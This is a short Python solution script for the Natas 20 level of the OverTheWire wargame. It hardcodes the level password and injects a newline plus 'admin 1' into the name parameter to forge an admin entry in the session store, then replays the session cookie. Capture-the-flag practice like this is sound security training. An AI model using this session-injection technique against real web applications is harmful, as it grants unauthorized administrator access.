import requests


url = "http://natas20.natas.labs.overthewire.org/index.php"
pw = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"


s = requests.Session()
s.auth = ('natas20', pw)
params = (("debug", "true"), ("name", "whatevername\nadmin 1"))

r = s.get(url, params=params)

print(r.text)
cookie = r.headers['Set-Cookie']
sid = cookie.split(":").__getitem__(0)
session_id = sid.split("=").__getitem__(1)[:-6]

cookie = {"PHPSESSID": session_id}
s = requests.Session()
s.auth = ('natas20', pw)
params = {"debug": "true"}
r = s.get(url, params=params, cookies=cookie)

print(r.text)